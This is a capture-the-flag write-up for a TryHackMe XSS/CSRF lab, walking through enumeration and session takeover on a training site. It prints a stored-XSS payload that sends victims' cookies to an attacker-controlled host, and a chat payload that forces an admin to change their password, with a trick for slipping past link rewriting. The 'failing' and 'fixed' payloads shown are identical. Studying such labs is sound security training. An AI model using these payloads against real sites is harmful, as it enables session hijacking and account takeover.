# What’s My Name CSRF Challenge — TryHackme


This challenge tests client-side exploitation skills, from inspecting JavaScript to manipulating cookies to launching CSRF/XSS attacks.

## Nmap Scan

As with all challenges, we need to perform an Nmap scan to map the machine’s open services:

SSH is not useful unless we have a username and password. After checking the other two ports, they are identical. Since we have a web application, we can enumerate the directories with GoBuster.

## Editing /etc/hosts

As the mission guides, we need to edit the `/etc/hosts` file to include the domain:

## Web Application

We can see that the web application navigates by default to the following page with the path of `/public/html`.

Going a folder before that, we can see the JavaScript, CSS, and HTML of the page.

## JavaScript Directory

In the `js` directory, we can see some interesting functions used within the web application.

## Register Page

Another feature is the Register page. One thing that caught my eye is the Name field. Since it is an XSS/CSRF challenge, I decided to send cookies to my machine to see if I could get a user’s session token to take over.

In the register page, the details should be filled, with the Name field containing the payload in it:

```html
<script>
var img = new Image();
img.src = 'http://<ip>:<port>/stealcookies?' + document.cookie;
</script>
```

After waiting a few seconds, the payload did its job, and now we have session cookies to work with.

## Using the Cookies

Use the cookies by updating the session token, then reload the page. Once refreshed, I managed to access the Moderator account successfully.

Notice the message below — `login.worldwap.thm` is available to access. Yet nothing here.

## Login Page

So I tried to insert `login.php` since the `/public/js` contained the `login.js`, so I took a guess, and it worked. Insert the PHP session token again, and you will manage to get into the user account. From there, we can see the flag in plain sight.

## Admin Flag

Now we need the Admin flag. I poked around the website, and the first thing I tried was to XSS the search field, in vain.

The change password is an interesting vector, but since we got in using the session token and not the password, we can’t really use it directly.

When I tried it, I was greeted with the message saying only the admin can change the password.

## Chat Page

I went to the Go to Chat page, attempting the XSS PoC payload, which worked. I also noticed that when I refreshed the page, the alert message kept appearing — which makes sense since the messages are stored on the server and presented to the user every time they are in the chat.

Since I know the admin will open the chat box, I know they’ll get the same payload as I do. So I used the payload from task 7 from the CSRF TryHackMe room and crafted it to point to the change password page:

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', "http" + "://login.worldwap.thm/change_password.php", true);
xhr.setRequestHeader("X-Requested-With", "XMLHttpRequest");
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.onreadystatechange = function () {
if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
alert("Action executed!");
}
};
xhr.send('action=execute&new_password=lidorroccah');
</script>
```

The `alert("Action executed!");` did not work as there was no pop-up message to indicate success PoC, so the payload did not work.

## Troubleshooting

Since the payload did not work for me, I asked ChatGPT what I could do, and one of its suggestions was to check if the payload was not tampered with by the server. Since it’s an XSS, and the payload is a part of the browser, you can check from the page source, and I discovered the payload was interrupted by the `<a href:`.

The browser recognized it as a link, so what we need to do is to break it, even for a bit, so it won’t read it as a link.

For example:

From `http://login.worldwap.thm/change_password.php` ===> `http` + `://login.worldwap.thm/change_password.php`

Let’s try it out:

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', "http" + "://login.worldwap.thm/change_password.php", true);
xhr.setRequestHeader("X-Requested-With", "XMLHttpRequest");
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.onreadystatechange = function () {
if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
alert("Action executed!");
}
};
xhr.send('action=execute&new_password=lidorroccah');
</script>
```

Put it in the message box. We can see that the payload has worked. It also means that the admin password has changed.

This also worked due to the SOP policy being met as the payload works on the same domain and protocol.

Once the password is changed, log in with the user `admin` and the password you set, and you should be able to see the admin flag.